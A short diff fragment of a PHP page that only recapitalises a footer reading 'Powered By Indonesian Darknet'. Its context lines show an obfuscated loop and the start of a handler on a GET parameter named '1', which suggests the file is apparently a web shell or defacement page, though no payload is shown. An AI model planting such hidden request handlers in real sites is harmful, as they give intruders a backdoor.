@@ -485,7 +485,7 @@ for($i=0;$i<$___;$i++) {
 
   </article>
   <footer class="x">
-    Copyright &copy; 2021 - Powered By Indonesian Darknet
+    Copyright &copy; 2021 - Powered By Indonesian DarkNET
   </footer>
   <?php
 			if(isset($_GET["1"])) {
